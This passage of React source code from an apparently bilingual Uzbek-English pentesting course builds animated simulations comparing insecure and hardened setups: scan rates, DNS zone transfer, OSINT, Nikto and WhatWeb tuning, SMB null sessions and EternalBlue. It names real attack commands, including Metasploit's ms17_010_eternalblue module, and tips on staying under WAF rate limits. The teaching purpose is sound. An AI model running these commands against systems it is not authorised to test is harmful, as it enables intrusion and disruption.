    {col:AM,uz:"VoIP telefon va veb-server javob berishni to'xtatadi — paketlar tushib qolmoqda",en:"The VoIP phone and web server stop responding — packets are being dropped",duz:"Skan bilan bog'liq bo'lmagan xizmatlar ham jabrlanadi.",den:"Even services unrelated to the scan get hurt."},
    {col:D,uz:"🔥 Tasodifiy DoS — nishon tarmog'i vaqtincha ishdan chiqdi",en:"🔥 Accidental DoS — the target network went down temporarily",duz:"«Faqat skanerlash» edi, lekin natija haqiqiy hujum bilan bir xil.",den:"It was «just a scan», but the result matches a real attack.",final:true,bad:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="safe"?SAFE:RECKLESS;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="safe"?SAFE:run==="reckless"?RECKLESS:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu /24 tarmoqni ehtiyotkor va beparvo --rate bilan skanerlashni solishtiring.","⬇ Pick a scenario — compare scanning the same /24 network with a careful versus a reckless --rate.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="safe"?t(lang,"✓ Ehtiyotkor tezlik: to'liq va oqibatsiz","✓ Careful rate: complete and consequence-free"):t(lang,"✗ Beparvo tezlik: tasodifiy DoS keltirib chiqardi","✗ Reckless rate: caused an accidental DoS")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("safe");setStep(-1);},style:{flex:1,padding:"9px",background:run==="safe"?A+"22":SL2,color:run==="safe"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Ehtiyotkor (--rate=1000)","✅ Careful (--rate=1000)")),
      React.createElement("button",{onClick:()=>{setRun("reckless");setStep(-1);},style:{flex:1,padding:"9px",background:run==="reckless"?D+"22":SL2,color:run==="reckless"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔥 Beparvo (--rate=100000)","🔥 Reckless (--rate=100000)"))));
}

function AXFRSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const OPEN=[
    {col:BL,uz:"dig axfr @ns1.example.com example.com — so'rov yuborildi",en:"dig axfr @ns1.example.com example.com — the query is sent",duz:"Har qanday kishi shu bitta buyruqni yozishi mumkin.",den:"Anyone can type this exact same command."},
    {col:AM,uz:"Server hech qanday tekshiruv qilmaydi — so'ragan har kimga ruxsat beradi",en:"The server performs no check — it allows anyone who asks",duz:"Zona transferi faqat ikkilamchi (secondary) DNS serverlar uchun mo'ljallangan edi.",den:"Zone transfer was meant only for secondary DNS servers."},
    {col:AM,uz:"BARCHA yozuvlar (200+ subdomen, ichki IP, admin panellari) bir zumda tushadi",en:"ALL records (200+ subdomains, internal IPs, admin panels) dump instantly",duz:"Bitta so'rov — infratuzilmaning to'liq xaritasi.",den:"One query — a complete map of the infrastructure."},
    {col:D,uz:"💰 Oltin qazilma — butun infratuzilma bir buyruqda qo'lga tushdi",en:"💰 A goldmine — the whole infrastructure captured in a single command",duz:"Endi qaysi subdomenni brute-force qilish shart emas — hammasi allaqachon qo'lda.",den:"No more need to brute-force subdomains — everything is already in hand.",final:true,bad:true}
  ];
  const CLOSED=[
    {col:BL,uz:"dig axfr @ns1.example.com example.com — xuddi shu so'rov yuboriladi",en:"dig axfr @ns1.example.com example.com — the exact same query is sent",duz:"Hujumchi tomonidan hech narsa boshqacha qilinmaydi.",den:"The attacker does nothing differently."},
    {col:AM,uz:"Server so'rovchi manzilni tekshiradi — faqat ro'yxatdagi ikkilamchi serverlarga ruxsat",en:"The server checks the requester's address — only whitelisted secondary servers are allowed",duz:"Bu — DNS serverni to'g'ri sozlashning bir qismi.",den:"This is part of correctly configuring a DNS server."},
    {col:AM,uz:"Kali'ning IP manzili bu ro'yxatda yo'q",en:"Kali's IP address isn't on that list",duz:"So'rov manba darajasida rad etiladi.",den:"The request is rejected right at the source check."},
    {col:A,uz:"🔒 «Transfer failed» — to'g'ri sozlangan himoya ishladi",en:"🔒 «Transfer failed» — the properly configured defense worked",duz:"Hujumchi endi brute-force kabi sekinroq usulga o'tishga majbur.",den:"The attacker is now forced back to a slower method like brute-force.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="open"?OPEN:CLOSED;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="open"?OPEN:run==="closed"?CLOSED:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu AXFR so'rovi ochiq va to'g'ri cheklangan DNS serverda qanday farq qilishini ko'ring.","⬇ Pick a scenario — see how the same AXFR request differs between an open and a properly restricted DNS server.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="open"?t(lang,"✗ Ochiq AXFR: butun zona oshkor bo'ldi","✗ Open AXFR: the whole zone was exposed"):t(lang,"✓ Cheklangan AXFR: so'rov rad etildi","✓ Restricted AXFR: the request was rejected")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("open");setStep(-1);},style:{flex:1,padding:"9px",background:run==="open"?D+"22":SL2,color:run==="open"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"💰 Ochiq AXFR (xato)","💰 Open AXFR (misconfigured)")),
      React.createElement("button",{onClick:()=>{setRun("closed");setStep(-1);},style:{flex:1,padding:"9px",background:run==="closed"?A+"22":SL2,color:run==="closed"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔒 Cheklangan AXFR (to'g'ri)","🔒 Restricted AXFR (correct)"))));
}

function OSINTExposureSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const LEAKY=[
    {col:BL,uz:"theHarvester -d bigcorp.com -b crtsh,google,linkedin — so'rov yuborildi",en:"theHarvester -d bigcorp.com -b crtsh,google,linkedin — the query is sent",duz:"Hujumchi hech qanday maxsus mahorat ko'rsatmadi — bu standart so'rov.",den:"The attacker showed no special skill — this is a standard query."},
    {col:AM,uz:"crt.sh: 340 ta sertifikat — dev, staging, old-vpn, admin-panel kabi 60+ subdomen oshkor",en:"crt.sh: 340 certificates — 60+ subdomains exposed, like dev, staging, old-vpn, admin-panel",duz:"Har bir subdomen uchun alohida sertifikat chiqarilgan — hammasi jurnalda.",den:"A separate certificate was issued per subdomain — all of it logged."},
    {col:AM,uz:"LinkedIn: 200+ xodim profili — email formatini (ism.familiya@) taxmin qilish oson",en:"LinkedIn: 200+ employee profiles — easy to guess the email format (first.last@)",duz:"Ochiq profillar to'liq ism va lavozimni ko'rsatadi.",den:"Public profiles show full names and job titles."},
    {col:D,uz:"📂 To'liq xodim+infratuzilma ro'yxati — hech narsa yubormasdan olindi",en:"📂 A full employee+infrastructure list — obtained without sending a single packet",duz:"Bu ro'yxat keyingi fishing yoki parol hujumi uchun tayyor asos.",den:"This list is a ready-made foundation for the next phishing or password attack.",final:true,bad:true}
  ];
  const CLEAN=[
    {col:BL,uz:"theHarvester -d smallcorp.com -b crtsh,google,linkedin — xuddi shu so'rov",en:"theHarvester -d smallcorp.com -b crtsh,google,linkedin — the exact same query",duz:"Hujumchi tomonidan hech narsa boshqacha qilinmadi.",den:"The attacker did nothing differently."},
    {col:AM,uz:"crt.sh: faqat 3 ta sertifikat (wildcard *.smallcorp.com) — subdomen nomlari yashirin",en:"crt.sh: only 3 certificates (a wildcard *.smallcorp.com) — subdomain names stay hidden",duz:"Bitta wildcard sertifikat cheksiz subdomenni bitta yozuv orqasiga yashiradi.",den:"One wildcard certificate hides unlimited subdomains behind a single entry."},
    {col:AM,uz:"LinkedIn: kompaniya sahifasi yopiq, xodimlar profilida ish joyi ko'rsatilmagan",en:"LinkedIn: the company page is private, employees don't list their employer",duz:"Bu — texnik emas, tashkiliy siyosat natijasi.",den:"This is the result of policy, not technology."},
    {col:A,uz:"🔒 Deyarli bo'sh natija — OSINT gigienasi hujumchini «ko'r» qoldirdi",en:"🔒 Almost nothing — OSINT hygiene left the attacker «blind»",duz:"Passiv razvedka faqat nishon ochiq bo'lgan qadar samarali.",den:"Passive recon is only as effective as the target is exposed.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="leaky"?LEAKY:CLEAN;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="leaky"?LEAKY:run==="clean"?CLEAN:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — bir xil theHarvester so'rovi ikki xil kompaniyada qancha ma'lumot ochib berishini solishtiring.","⬇ Pick a scenario — see how much the same theHarvester query reveals about two different companies.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="leaky"?t(lang,"✗ Oshkor kompaniya: OSINT hamma narsani beradi","✗ Exposed company: OSINT gives up everything"):t(lang,"✓ Gigienik kompaniya: OSINT deyarli hech narsa topmaydi","✓ Hygienic company: OSINT finds almost nothing")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("leaky");setStep(-1);},style:{flex:1,padding:"9px",background:run==="leaky"?D+"22":SL2,color:run==="leaky"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"📂 «Oshkor» kompaniya","📂 «Exposed» company")),
      React.createElement("button",{onClick:()=>{setRun("clean");setStep(-1);},style:{flex:1,padding:"9px",background:run==="clean"?A+"22":SL2,color:run==="clean"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔒 «Gigienik» kompaniya","🔒 «Hygienic» company"))));
}

function NiktoTuningSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const FULL=[
    {col:BL,uz:"nikto -h target.com — barcha 6700+ sinov ishga tushiriladi",en:"nikto -h target.com — all 6700+ tests are launched",duz:"Hech qanday cheklov yo'q — Nikto o'zining to'liq ro'yxatini sinaydi.",den:"No filtering at all — Nikto runs through its entire list."},
    {col:AM,uz:"Daqiqada 300+ so'rov yuboriladi — WAF buni «flood» deb belgilaydi",en:"300+ requests per minute go out — the WAF flags it as a «flood»",duz:"Bunday zichlikdagi so'rov oddiy foydalanuvchi trafigiga o'xshamaydi.",den:"Traffic this dense doesn't look like an ordinary user."},
    {col:AM,uz:"~50% da WAF Kali'ning IP manzilini vaqtincha bloklaydi",en:"At ~50% the WAF temporarily blocks Kali's IP address",duz:"Rate-limit chegarasi oshib ketdi.",den:"The rate-limit threshold was exceeded."},
    {col:D,uz:"🚫 Skan yarim yo'lda to'xtadi — natija to'liq emas",en:"🚫 The scan stops halfway — the results are incomplete",duz:"Qolgan 3300+ sinov hech qachon bajarilmadi.",den:"The remaining 3,300+ tests never ran.",final:true,bad:true}
  ];
  const TUNED=[
    {col:BL,uz:"nikto -h target.com -Tuning 1234 — faqat 4 toifadagi sinov tanlandi",en:"nikto -h target.com -Tuning 1234 — only 4 test categories are selected",duz:"Masalan faqat fayl oshkoralashuvi va konfiguratsiya xatolari.",den:"For example only file disclosure and misconfiguration checks."},
    {col:AM,uz:"So'rovlar soni ~10 barobar kamayadi — WAF chegarasidan pastda qoladi",en:"The request count drops ~10x — it stays under the WAF's threshold",duz:"Har daqiqada atigi 30 so'rov — oddiy trafikka yaqinroq.",den:"Only ~30 requests per minute — closer to ordinary traffic."},
    {col:AM,uz:"Skan bloklanmasdan oxirigacha yetadi",en:"The scan reaches the end without being blocked",duz:"IP hech qachon qora ro'yxatga tushmaydi.",den:"The IP never gets blacklisted."},
    {col:A,uz:"✅ To'liq natija — kerakli toifalar tekshirildi, iz kam qoldi",en:"✅ Full results — the needed categories were checked, with a lighter footprint",duz:"Hammasi emas, lekin kerak bo'lgani — va oxirigacha yetkazilgan holda.",den:"Not everything, but what was needed — and carried through to completion.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="full"?FULL:TUNED;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="full"?FULL:run==="tuned"?TUNED:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu veb-serverni cheklovsiz va -Tuning bilan skanerlashni solishtiring.","⬇ Pick a scenario — compare scanning the same web server unfiltered versus with -Tuning.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="full"?t(lang,"✗ Cheklovsiz: WAF yarim yo'lda to'xtatdi","✗ Unfiltered: the WAF stopped it halfway"):t(lang,"✓ -Tuning bilan: to'liq skan, bloklanmadi","✓ With -Tuning: a complete scan, never blocked")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("full");setStep(-1);},style:{flex:1,padding:"9px",background:run==="full"?D+"22":SL2,color:run==="full"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🌊 Barcha sinovlar","🌊 All tests")),
      React.createElement("button",{onClick:()=>{setRun("tuned");setStep(-1);},style:{flex:1,padding:"9px",background:run==="tuned"?A+"22":SL2,color:run==="tuned"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🎯 -Tuning 1234","🎯 -Tuning 1234"))));
}

function WhatWebAggroSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const A1=[
    {col:BL,uz:"whatweb -a 1 target.com — faqat bosh sahifaga bitta so'rov",en:"whatweb -a 1 target.com — just one request to the homepage",duz:"Eng yashirin daraja — deyarli oddiy brauzer so'rovidek ko'rinadi.",den:"The stealthiest level — looks almost like an ordinary browser request."},
    {col:AM,uz:"Aniqlandi: Apache, PHP — sarlavhalardan ko'ringan narsalar",en:"Detected: Apache, PHP — what's visible from the headers",duz:"Bitta so'rov faqat sirtdagi narsani ko'rsatadi.",den:"A single request only reveals what's on the surface."},
    {col:AM,uz:"CMS versiyasi ANIQLANMADI — buning uchun qo'shimcha yo'llar (/wp-login.php) tekshirilishi kerak edi",en:"CMS version NOT detected — that would need extra paths tested (/wp-login.php)",duz:"WordPress bor-yo'qligi ham aniq emas, faqat taxmin.",den:"Whether WordPress is even present is unclear — only a guess."},
    {col:D,uz:"🌫 Yarim rasm — versiyasiz maqsadli hujum rejalashtirib bo'lmaydi",en:"🌫 A half picture — without a version, no targeted attack can be planned",duz:"Yashirinlik uchun ma'lumot chuqurligidan voz kechildi.",den:"Depth of information was traded away for stealth.",final:true,bad:true}
  ];
  const A4=[
    {col:BL,uz:"whatweb -a 4 target.com — o'nlab qo'shimcha yo'l va fayl tekshiriladi",en:"whatweb -a 4 target.com — dozens of extra paths and files are probed",duz:"Endi bitta emas, ko'plab so'rov ketma-ket yuboriladi.",den:"Now not one but many requests go out in sequence."},
    {col:AM,uz:"/wp-login.php, /wp-content/, readme.html kabi WordPress'ga xos yo'llar sinaladi",en:"WordPress-specific paths like /wp-login.php, /wp-content/, readme.html are tried",duz:"Har CMS'ning o'ziga xos «imzo fayllari» bor.",den:"Every CMS has its own tell-tale «signature files»."},
    {col:AM,uz:"Aniqlandi: WordPress 5.2, o'rnatilgan plaginlar ro'yxati bilan",en:"Detected: WordPress 5.2, along with a list of installed plugins",duz:"Chuqurroq tekshiruv — chuqurroq javob.",den:"A deeper probe — a deeper answer."},
    {col:A,uz:"🎯 To'liq rasm — searchsploit wordpress 5.2 bilan darhol qidiruv boshlanadi",en:"🎯 A full picture — a targeted searchsploit wordpress 5.2 lookup can start right away",duz:"Aniq versiya — aniq hujum rejasi.",den:"An exact version — an exact attack plan.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="a1"?A1:A4;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="a1"?A1:run==="a4"?A4:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu saytni -a 1 va -a 4 bilan tekshirishni solishtiring.","⬇ Pick a scenario — compare probing the same site with -a 1 versus -a 4.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="a1"?t(lang,"✗ -a 1: yashirin, lekin sayoz","✗ -a 1: stealthy, but shallow"):t(lang,"✓ -a 4: chuqur, versiyagacha aniq","✓ -a 4: deep, down to the exact version")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("a1");setStep(-1);},style:{flex:1,padding:"9px",background:run==="a1"?D+"22":SL2,color:run==="a1"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🌫 -a 1 (yashirin)","🌫 -a 1 (stealthy)")),
      React.createElement("button",{onClick:()=>{setRun("a4");setStep(-1);},style:{flex:1,padding:"9px",background:run==="a4"?A+"22":SL2,color:run==="a4"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🎯 -a 4 (agressiv)","🎯 -a 4 (aggressive)"))));
}

function NullSessionSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const ALLOWED=[
    {col:BL,uz:"enum4linux -a 10.0.0.5 — SMB'ga parolsiz (null session) ulanishga urinadi",en:"enum4linux -a 10.0.0.5 — attempts an SMB connection with no password (null session)",duz:"Foydalanuvchi nomi ham, parol ham berilmaydi.",den:"No username, no password is supplied at all."},
    {col:AM,uz:"Eski Windows Server 2008: null session RUXSAT ETILGAN",en:"Old Windows Server 2008: null session is ALLOWED",duz:"Eski standart sozlama anonim SMB ulanishga yo'l qo'yardi.",den:"The old default configuration permitted anonymous SMB connections."},
    {col:AM,uz:"15 ta foydalanuvchi nomi, guruhlar va parol siyosati to'liq chiqadi",en:"15 usernames, groups and the password policy all come out in full",duz:"Autentifikatsiyasiz — bitta ham parol kiritilmadi.",den:"Without authentication — not a single password was entered."},
    {col:D,uz:"🔓 To'liq profil — endi faqat parolni topish qoldi",en:"🔓 A full profile — only finding the password remains",duz:"Foydalanuvchi nomlari ro'yxati brute-force uchun tayyor asos.",den:"The username list is a ready-made base for brute-forcing.",final:true,bad:true}
  ];
  const RESTRICTED=[
    {col:BL,uz:"enum4linux -a 10.0.0.9 — xuddi shu null session urinishi",en:"enum4linux -a 10.0.0.9 — the exact same null-session attempt",duz:"Hujumchi tomonidan hech narsa boshqacha qilinmadi.",den:"The attacker does nothing differently."},
    {col:AM,uz:"Zamonaviy Windows Server 2022: null session TAQIQLANGAN (standart)",en:"Modern Windows Server 2022: null session is DISABLED (the default)",duz:"Zamonaviy Windows anonim SMB ulanishni sukut bo'yicha yopadi.",den:"Modern Windows blocks anonymous SMB by default."},
    {col:AM,uz:"NT_STATUS_ACCESS_DENIED — hech qanday foydalanuvchi nomi olinmadi",en:"NT_STATUS_ACCESS_DENIED — no usernames are extracted at all",duz:"So'rov autentifikatsiya darajasida rad etiladi.",den:"The request is rejected right at the authentication check."},
    {col:A,uz:"🔒 Deyarli bo'sh natija — hujumchi hech kimning nomini bilmaydi",en:"🔒 An almost empty result — the attacker doesn't learn a single name",duz:"Parol hujumi uchun kerakli «yarim yo'l» bu safar yo'q.",den:"The «halfway point» needed for a password attack simply isn't there this time.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="allowed"?ALLOWED:RESTRICTED;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="allowed"?ALLOWED:run==="restricted"?RESTRICTED:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu null session urinishi eski va zamonaviy Windows'da qanday farq qilishini ko'ring.","⬇ Pick a scenario — see how the exact same null-session attempt differs on old versus modern Windows.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="allowed"?t(lang,"✗ Null session ruxsat etilgan: to'liq profil oshkor","✗ Null session allowed: a full profile is exposed"):t(lang,"✓ Null session taqiqlangan: hech narsa oshkor bo'lmaydi","✓ Null session disabled: nothing gets exposed")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("allowed");setStep(-1);},style:{flex:1,padding:"9px",background:run==="allowed"?D+"22":SL2,color:run==="allowed"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔓 Eski Windows (2008)","🔓 Old Windows (2008)")),
      React.createElement("button",{onClick:()=>{setRun("restricted");setStep(-1);},style:{flex:1,padding:"9px",background:run==="restricted"?A+"22":SL2,color:run==="restricted"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔒 Zamonaviy Windows (2022)","🔒 Modern Windows (2022)"))));
}

function EternalBlueSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const VULN=[
    {col:BL,uz:"nmap --script smb-vuln-ms17-010 -p445 10.0.0.5 — SMBv1 yoqilgan, patch qilinmagan",en:"nmap --script smb-vuln-ms17-010 -p445 10.0.0.5 — SMBv1 is on, unpatched",duz:"2017-yilgi zaiflik hamon ochiq turibdi.",den:"A 2017 vulnerability still sitting wide open."},
    {col:AM,uz:"Natija: VULNERABLE — MS17-010 (EternalBlue) tasdiqlandi",en:"Result: VULNERABLE — MS17-010 (EternalBlue) confirmed",duz:"WannaCry va NotPetya aynan shu kamchilikdan foydalangan.",den:"WannaCry and NotPetya both exploited exactly this flaw."},
    {col:AM,uz:"Metasploit exploit/windows/smb/ms17_010_eternalblue ishga tushiriladi",en:"Metasploit's exploit/windows/smb/ms17_010_eternalblue is launched",duz:"Tayyor, keng tarqalgan modul — maxsus bilim talab qilmaydi.",den:"A ready-made, widely used module — requires no special expertise."},
    {col:D,uz:"☠ Autentifikatsiyasiz TO'LIQ masofaviy kod bajarish — SYSTEM huquqi",en:"☠ Unauthenticated, FULL remote code execution — SYSTEM privileges",duz:"Login yoki parol umuman kerak bo'lmadi.",den:"No login or password was ever needed.",final:true,bad:true}
  ];
  const PATCHED=[
